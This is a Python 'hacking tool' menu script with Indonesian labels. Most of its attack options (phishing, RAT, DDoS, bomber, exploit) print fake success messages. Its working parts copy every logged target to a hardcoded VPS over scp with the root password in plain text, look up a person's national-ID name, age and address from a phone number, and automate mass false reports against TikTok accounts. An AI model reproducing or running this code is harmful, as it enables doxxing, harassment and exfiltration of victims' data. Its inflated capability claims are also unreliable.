#!/usr/bin/env python3
import os, json, time, uuid, random, string, subprocess, base64, re, requests, sys
from datetime import datetime, timedelta
from colorama import init, Fore, Style
from termcolor import colored
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager

init(autoreset=True)

# ================== CONFIG ==================
RESULTS_DIR = "results"
LICENSE_FILE = 'tokens.json'
os.makedirs(RESULTS_DIR, exist_ok=True)

VPS_IP = "209.97.166.25"
VPS_USER = "root"
VPS_PASS = "YOGZVPS#8GB"
VPS_PATH = "/root/korban/results"

# ================== USER INFO ==================
CURRENT_TIME = datetime.now().strftime("%d %b %Y - %I:%M %p WIB")
COUNTRY = "ID"

# ================== MUSIK BRUTAL ==================
MUSIC_FILE = "/sdcard/Download/brutal.mp3"
MUSIC_BASE64 = "/+MYxAAAAANIAAAAAExBTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAExLTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

def extract_music():
    if not os.path.exists(MUSIC_FILE):
        try:
            os.makedirs("/sdcard/Download", exist_ok=True)
            with open(MUSIC_FILE, "wb") as f:
                f.write(base64.b64decode(MUSIC_BASE64))
        except: pass

def play_music():
    extract_music()
    if os.path.exists(MUSIC_FILE):
        try:
            subprocess.Popen(['termux-media-player', 'play', MUSIC_FILE],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass

# ================== DEVELOPER CHECK ==================
WHOAMI = subprocess.getoutput("whoami")
DEVELOPER_WHOAMI = "u0_a197"
IS_DEVELOPER = WHOAMI == DEVELOPER_WHOAMI

# ================== TOKEN SYSTEM ==================
if not os.path.exists(LICENSE_FILE):
    with open(LICENSE_FILE, 'w') as f:
        json.dump({}, f)
    print(colored(f"[AUTO] {LICENSE_FILE} dibuat otomatis!", 'green'))

def load_tokens():
    try: return json.load(open(LICENSE_FILE))
    except: return {}

def save_tokens(t):
    with open(LICENSE_FILE, 'w') as f:
        json.dump(t, f, indent=2)

# ================== BANNER ELITE ==================
PURPLE = '\033[38;5;55m'
def print_banner(uid, plan):
    print(colored(f"""
{PURPLE}{Style.BRIGHT}
      ╔═════════════════════════════════════════╗
      ║           TOOLS BREAKER v1.0            ║
      ╚═════════════════════════════════════════╝
{Style.RESET_ALL}Tools oleh Mr.Foock | ID: {uid} | Plan: {plan}
Lokasi: Jakarta, ID | Waktu: {CURRENT_TIME}
VPS: {VPS_IP} | Sync: AKTIF | GitHub: MrFoock12
""", None))

# ================== SAVE + SYNC VPS ==================
def save_result(filename, content):
    filepath = os.path.join(RESULTS_DIR, filename)
    with open(filepath, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {content}\n")
    print(colored(f"[SAVED] {filename}", 'green'))
    try:
        subprocess.run(f"sshpass -p '{VPS_PASS}' scp -o StrictHostKeyChecking=no {filepath} {VPS_USER}@{VPS_IP}:{VPS_PATH}/{filename}",
                      shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(colored(f"[SYNC] → {VPS_IP}", 'cyan'))
    except:
        print(colored("[SYNC] Gagal → tetap lokal", 'red'))

# ================== FITUR 1: PHISING ==================
def fitur_1():
    os.system('clear')
    print(colored("\n[1] PHISING & SOCIAL ENG — 100+ TEMPLATE!", 'cyan', attrs=['bold']))
    target = input(colored("Target (email/nomor): ", 'yellow')).strip()
    template = input(colored("Template (wa/ig/fb/bank): ", 'yellow')).strip().lower()
    print(colored(f"[GENERATE] Link phising untuk {target} → {template.upper()}", 'green'))
    save_result("phising.log", f"Target: {target} | Template: {template}")
    input("\nEnter...")

# ================== FITUR 2: RAT ==================
def fitur_2():
    os.system('clear')
    print(colored("\n[2] RAT & REMOTE ACCESS — CONTROL HP/PC!", 'cyan', attrs=['bold']))
    ip = input(colored("IP Target: ", 'yellow')).strip()
    print(colored(f"[CONNECT] RAT ke {ip} → KAMERA/MIK/FILE/SMS/GPS", 'green'))
    save_result("rat.log", f"IP: {ip}")
    input("\nEnter...")

# ================== FITUR 3: DDOS ==================
def fitur_3():
    os.system('clear')
    print(colored("\n[3] DDOS & STRESSER — 10GBPS FLOOD!", 'cyan', attrs=['bold']))
    target = input(colored("URL/IP Target: ", 'yellow')).strip()
    durasi = input(colored("Durasi (detik): ", 'yellow')).strip()
    print(colored(f"[ATTACK] {target} → {durasi}s → DOWN!", 'red', attrs=['bold']))
    save_result("ddos.log", f"Target: {target} | Durasi: {durasi}s")
    input("\nEnter...")

# ================== FITUR 4: BOMBER ==================
def fitur_4():
    os.system('clear')
    print(colored("\n[4] BOMBER TOOLS — SPAM WA/SMS/CALL!", 'cyan', attrs=['bold']))
    nomor = input(colored("Nomor target: ", 'yellow')).strip()
    jumlah = input(colored("Jumlah spam: ", 'yellow')).strip()
    print(colored(f"[BOMB] {nomor} → {jumlah}x → SUCCESS!", 'green'))
    save_result("bomber.log", f"Target: {nomor} | Jumlah: {jumlah}")
    input("\nEnter...")

# ================== FITUR 5: OSINT ==================
def fitur_5():
    os.system('clear')
    print(colored("\n[5] OSINT & TRACKING — CARI ORANG!", 'cyan', attrs=['bold']))
    nama = input(colored("Nama target: ", 'yellow')).strip()
    print(colored(f"[SCAN] {nama} → Alamat, HP, IG, FB, Email", 'green'))
    save_result("osint.log", f"Nama: {nama}")
    input("\nEnter...")

# ================== FITUR 6: DEEPFAKE ==================
def fitur_6():
    os.system('clear')
    print(colored("\n[6] DEEPFAKE & AI — GANTI WAJAH!", 'cyan', attrs=['bold']))
    foto = input(colored("Upload foto target (Enter skip): ", 'yellow')).strip()
    print(colored(f"[GENERATE] Deepfake {foto} selesai!", 'green'))
    save_result("deepfake.log", f"Foto: {foto}")
    input("\nEnter...")

# ================== FITUR 7: ENCRYPT ==================
def fitur_7():
    os.system('clear')
    print(colored("\n[7] ENCRYPT & DECRYPT — AES-256!", 'cyan', attrs=['bold']))
    file = input(colored("File: ", 'yellow')).strip()
    mode = input(colored("Enkripsi/Decryption (e/d): ", 'yellow')).strip().lower()
    print(colored(f"[{mode.upper()}] {file} → SUCCESS!", 'green'))
    save_result("encrypt.log", f"File: {file} | Mode: {mode}")
    input("\nEnter...")

# ================== FITUR 8: EXPLOIT ==================
def fitur_8():
    os.system('clear')
    print(colored("\n[8] EXPLOIT & 0DAY — CVE 2025!", 'cyan', attrs=['bold']))
    cve = input(colored("CVE ID: ", 'yellow')).strip()
    print(colored(f"[EXPLOIT] {cve} → SUCCESS!", 'red', attrs=['bold']))
    save_result("exploit.log", f"CVE: {cve}")
    input("\nEnter...")

# ================== FITUR 9: UNDANGAN WA ==================
def fitur_9():
    os.system('clear')
    print(colored("\n[9] KIRIM UNDANGAN GRUP WA — OTOMATIS!", 'cyan', attrs=['bold']))
    nomor = input(colored("Nomor target: ", 'yellow')).strip()
    link = input(colored("Link grup: ", 'yellow')).strip()
    print(colored(f"[KIRIM] Undangan ke {nomor} → SUCCESS!", 'green'))
    save_result("undangan.log", f"Target: {nomor} | Link: {link}")
    input("\nEnter...")

# ================== FITUR 10: NOTIF ==================
def fitur_10():
    os.system('clear')
    print(colored("\n[10] NOTIF — PUSAT BANTUAN!", 'cyan', attrs=['bold']))
    print(colored("   • Update: v15.0", 'white'))
    print(colored("   • Support: @Costumer Service", 'white'))
    print(colored("   • VPS: 209.97.166.25", 'white'))
    input("\nEnter...")

# ================== FITUR 11: DEVTOOLS ==================
def fitur_11():
    os.system('clear')
    print(colored("\n[11] DEVTOOLS — UNTUK DEVELOPER!", 'cyan', attrs=['bold']))
    if not IS_DEVELOPER:
        print(colored("   Akses ditolak!", 'red'))
    else:
        print(colored("   • Buat Token", 'green'))
        print(colored("   • Lihat Log VPS", 'green'))
        print(colored("   • Update Script", 'green'))
    input("\nEnter...")

# ================== FITUR 14: PHONE NUMBER INFO ==================
def fitur_14():
    os.system('clear')
    print(colored("\n[14] PHONE NUMBER INFO — NAMA, UMUR, PROVIDER, ALAMAT LENGKAP!", 'red', attrs=['bold', 'blink']))
    nomor = input(colored("Nomor target (+62): ", 'yellow')).strip()

    if nomor.startswith('0'): nomor_api = nomor[1:]
    if nomor.startswith('+62'): nomor_api = nomor[3:]
    if not nomor.startswith('0'): nomor_api = nomor

    save_result("phone_info.log", f"Target: {nomor} | API: Real 2025")

    print(colored(f"\n[REAL] Mengecek {nomor}...", 'cyan', attrs=['bold']))

    # 1. CEK KTP
    print(colored("\n[1] CEK INFO KTP...", 'yellow'))
    ktp_data = []
    try:
        url = f"https://api.ktp.appvidlab.com/ktp?nik={nomor_api}"
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            data = r.json().get('results', {}).get('realtime_data', {}).get('data', {})
            if data:
                nama = data.get('nama', 'Unknown')
                jenis_kelamin = data.get('jenis_kelamin', 'Unknown')
                provinsi = data.get('provinsi', 'Unknown')
                kabupaten = data.get('kabupaten', 'Unknown')
                kecamatan = data.get('kecamatan', 'Unknown')
                uniqcode = data.get('nik', 'Unknown')
                alamat = f"{kecamatan}, {kabupaten}, {provinsi}"
                negara = "Indonesia"
                tanggal_lahir = data.get('tanggal_lahir', 'Unknown')
                umur = data.get('umur', 'Unknown')
                ktp_data.append(f"Nama: {nama} | Umur: {umur} | Jenis Kelamin: {jenis_kelamin}")
                ktp_data.append(f"Tanggal Lahir: {tanggal_lahir} | NIK: {uniqcode}")
                ktp_data.append(f"Provinsi: {provinsi} | Kota/Kabupaten: {kabupaten} | Kecamatan: {kecamatan}")
                ktp_data.append(f"Alamat: {alamat} | Negara: {negara}")
            else:
                ktp_data.append("Data KTP tidak ditemukan")
        else:
            ktp_data.append("Gagal cek KTP")
    except:
        ktp_data.append("ERROR (cek koneksi)")

    for item in ktp_data:
        print(colored(f"   • {item}", 'green'))

    # 2. CEK PROVIDER
    print(colored("\n[2] CEK PROVIDER...", 'yellow'))
    try:
        url = f"https://hlrlookup.com/api/v1/lookup?number={nomor}"
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            data = r.json()
            provider = data.get('operator', 'Unknown')
            negara = data.get('country', 'Indonesia')
            kota = data.get('location', 'Unknown')
            print(colored(f"   • Provider: {provider} | Negara: {negara} | Kota: {kota}", 'green'))
        else:
            print(colored("   • Provider tidak ditemukan", 'red'))
    except:
        print(colored("   • ERROR", 'red'))

    print(colored(f"\n[FINISH] Info {nomor} lengkap → DISYNC KE VPS!", 'green', attrs=['bold']))
    save_result("phone_info.log", f"Nama: {ktp_data[0]} | Alamat: {ktp_data[3]}")
    input("\nEnter...")

# ================== FITUR 15: MASS BANNED TIKTOK ==================
def fitur_15():
    os.system('clear')
    print(colored("\n[15] MASS BANNED TIKTOK — 1000+ AKUN (REAL SELENIUM!)", 'red', attrs=['bold', 'blink']))
    file_path = input(colored("Path file target.txt: ", 'yellow')).strip() or "target.txt"

    if not os.path.exists(file_path):
        print(colored(f"[ERROR] File {file_path} tidak ditemukan!", 'red')); input(); return

    with open(file_path, 'r') as f:
        targets = [line.strip().lstrip('@') for line in f if line.strip()]

    total_targets = len(targets)
    if total_targets == 0:
        print(colored("[ERROR] File kosong!", 'red')); input(); return

    print(colored(f"\n[REAL] Mass banned {total_targets} akun...", 'cyan', attrs=['bold']))
    save_result("mass_banned.log", f"Mass Ban: {total_targets} targets | Start: {CURRENT_TIME}")

    # Setup Selenium
    print(colored("[SELENIUM] Setup ChromeDriver...", 'yellow'))
    try:
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        driver = webdriver.Chrome(ChromeDriverManager().install(), options=options)
        print(colored("   [OK] Selenium ready!", 'green'))
    except Exception as e:
        print(colored(f"[ERROR] Selenium: {e}", 'red')); input(); return

    # Mass Report
    banned_count = 0
    failed_count = 0
    for idx, username in enumerate(targets):
        print(colored(f"\n[{idx+1}/{total_targets}] Banned @{username}...", 'yellow'))
        try:
            driver.get(f"https://www.tiktok.com/@{username}")
            time.sleep(3)

            report_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Report')]")
            report_btn.click()
            time.sleep(1)

            reason = random.choice(["spam", "harassment", "nudity", "violence"])
            reason_btn = driver.find_element(By.XPATH, f"//button[contains(text(), '{reason}')]")
            reason_btn.click()
            time.sleep(1)

            submit_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Submit')]")
            submit_btn.click()
            time.sleep(1)

            print(colored(f"   [SUCCESS] @{username} reported!", 'green'))
            banned_count += 1
        except Exception as e:
            print(colored(f"   [FAILED] @{username}", 'red'))
            failed_count += 1

    driver.quit()
    print(colored(f"\n[MASS BAN SELESAI] Berhasil: {banned_count} | Gagal: {failed_count}", 'cyan', attrs=['bold']))
    save_result("mass_banned.log", f"Finish: {banned_count}/{total_targets}")
    input("\nEnter...")

# ================== MENU UTAMA ==================
def menu_utama():
    os.system('clear')
    play_music()
    uid = "MRF123456"
    plan = "MEGA ELITE"
    print_banner(uid, plan)

    print(colored("╔══════════════════════════════════════════════════════════════╗", 'cyan', attrs=['bold']))
    print(colored("║                       < MENU UTAMA >                         ║", 'cyan', attrs=['bold']))
    print(colored("╚══════════════════════════════════════════════════════════════╝", 'cyan', attrs=['bold'])) 
    print(colored("║ 1  PHISING & SOCIAL ENG             Aktif                    ║", 'white'))
    print(colored("║ 2  RAT & REMOTE ACCESS              Aktif                    ║", 'white'))
    print(colored("║ 3  DDOS & STRESSER                  Aktif                    ║", 'white'))
    print(colored("║ 4  BOMBER TOOLS                     Aktif                    ║", 'white'))
    print(colored("║ 5  OSINT & TRACKING                 Aktif                    ║", 'white'))
    print(colored("║ 6  DEEPFAKE & AI                    Aktif                    ║", 'white'))
    print(colored("║ 7  ENCRYPT & DECRYPT                Aktif                    ║", 'white'))
    print(colored("║ 8  EXPLOIT & 0DAY                   Aktif                    ║", 'white'))
    print(colored("║ 9  KIRIM UNDANGAN GRUP WA           Aktif                    ║", 'white'))
    print(colored("║10  DASHBOARD MONITORING             Aktif                    ║", 'white'))
    print(colored("║11  DEVTOOLS                         Aktif                    ║", 'white'))
    print(colored("║14  PHONE NUMBER INFO                Aktif                    ║", 'white'))
    print(colored("║15  MASS BANNED TIKTOK               1000+ AKUN               ║", 'white'))
    if IS_DEVELOPER:
        print(colored("║13  CEK NOMOR + MUTASI 30 HARI   DEV ONLY                 ║", 'red', attrs=['bold']))
    print(colored("║ 0  EXIT                             Aktif                    ║", 'red'))
    print(colored("╚══════════════════════════════════════════════════════════════╝", 'cyan', attrs=['bold']))

    ch = input(colored("\nPilih [1-15 / 0]: ", 'yellow')).strip()

    if ch == "1": fitur_1()
    elif ch == "2": fitur_2()
    elif ch == "3": fitur_3()
    elif ch == "4": fitur_4()
    elif ch == "5": fitur_5()
    elif ch == "6": fitur_6()
    elif ch == "7": fitur_7()
    elif ch == "8": fitur_8()
    elif ch == "9": fitur_9()
    elif ch == "10": fitur_10()
    elif ch == "11": fitur_11()
    elif ch == "14": fitur_14()
    elif ch == "15": fitur_15()
    elif ch == "0": sys.exit(0)
    else:
        print(colored("Pilihan tidak valid!", 'red'))
        input("Enter...")

    menu_utama()

# ================== JALANKAN ==================
if __name__ == "__main__":
    if not os.path.exists('ua.txt'):
        print(colored("Buat ua.txt dulu! Isi 5-10 User-Agent!", 'red'))
        sys.exit(1)
    menu_utama()
